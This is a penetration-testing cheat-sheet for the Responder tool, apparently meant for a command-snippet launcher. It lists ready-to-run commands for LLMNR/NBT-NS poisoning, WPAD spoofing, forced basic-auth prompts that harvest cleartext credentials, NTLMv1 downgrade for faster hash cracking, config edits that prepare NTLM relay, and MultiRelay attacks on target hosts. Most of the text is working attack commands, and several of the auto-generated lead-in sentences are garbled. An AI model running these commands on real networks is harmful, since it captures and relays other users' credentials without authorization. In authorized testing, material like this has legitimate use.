# Responder

LLMNR / NBT-NS / mDNS poisoner. Sits on a network segment and answers broadcast name-resolution requests, then captures NetNTLMv1/v2 from clients that try to authenticate. Pair with `mitm6.md`, `ntlmrelayx.md`, `coercer.md`.

<!-- cheat
export interface
var interface = printf 'tun0\neth0\nwlan0\n' --- --query tun0 --header "Select interface"
-->

## Responder

### Run

Run run with Responder.

Start Responder with poisoning enabled. Captures NetNTLM hashes from clients that fall back to broadcast resolution.

```sh title:"Responder Run Run"
sudo responder -I $interface
```
<!-- cheat
import interface
-->

### Analyze mode (passive)

Run analyze mode (passive) with Responder.

No poisoning - just log incoming broadcast traffic. Use first to understand what's noisy on the segment before going active.

```sh title:"Responder Run Analyze Mode (passive)"
sudo responder -I $interface -A
```
<!-- cheat
import interface
-->

### With WPAD

Run Responder with WPAD.

Enable the WPAD proxy auto-config response - tricks browsers into routing HTTP through Responder, exposing more auth opportunities.

```sh title:"Responder Run with WPAD"
sudo responder -I $interface --wpad
```
<!-- cheat
import interface
-->

### Force basic auth (cleartext)

Read force basic auth (cleartext) with Responder.

Force HTTP basic-auth dialog when WPAD challenges - sometimes catches users who type creds into a browser popup.

```sh title:"Responder Read Force Basic Auth (cleartext)"
sudo responder -I $interface --wpad -b
```
<!-- cheat
import interface
-->

### Force LM downgrade

Crack force LM downgrade with Responder.

Coerce captured auth to NetNTLMv1 instead of v2 - v1 cracks dramatically faster on weak passwords or via Crack.sh.

```sh title:"Responder Crack Force LM Downgrade"
sudo responder -I $interface --lm
```
<!-- cheat
import interface
-->

## Responder.conf tweaks

### Disable SMB/HTTP for relay

Disable SMB/HTTP for relay with Responder.

Disable SMB and HTTP servers in Responder.conf so they don't block ntlmrelayx's listeners (relay needs the ports free).

```sh title:"Responder Disable SMB/HTTP for Relay"
sed -i 's/SMB = On/SMB = Off/g; s/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
```
<!-- cheat -->

### Re-enable SMB/HTTP

Enable re enable SMB/HTTP with Responder.

Re-enable both servers after the relay run.

```sh title:"Responder Enable Re Enable SMB/HTTP"
sed -i 's/SMB = Off/SMB = On/g; s/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf
```
<!-- cheat -->

### Set NTLM challenge

Set NTLM challenge with Responder.

Set the static challenge value Responder uses. Defaults to `1122334455667788` for compatibility with rainbow tables.

```sh title:"Responder Set NTLM Challenge"
sed -i 's/Challenge =.*$/Challenge = $challenge/g' /usr/share/responder/Responder.conf
```
<!-- cheat
var challenge = printf '%s\n' '1122334455667788' --- --header 'Challenge'
-->

## Responder utilities

### MultiRelay specific users

Run MultiRelay specific users with Responder.

Run MultiRelay against a target, filtering for specific accounts (requires SMB+HTTP off in Responder.conf so the ports are free).

```sh title:"Responder Run MultiRelay Specific Users"
MultiRelay.py -t $rhost_ip -u $user1 $user2
```
<!-- cheat
import domain_ip
var user1
var user2
-->

### MultiRelay any user

Run MultiRelay any user with Responder.

Same MultiRelay but accept any successfully relayed account.

```sh title:"Responder Run MultiRelay Any User"
MultiRelay.py -t $rhost_ip -u ALL
```
<!-- cheat
import domain_ip
-->

### RunFinger SMB signing check

Check RunFinger SMB signing check with Responder.

Check whether targets enforce SMB signing - signing-disabled hosts are valid relay targets.

```sh title:"Responder Check RunFinger SMB Signing Check"
RunFinger.py -i $cidr
```
<!-- cheat
var cidr
-->
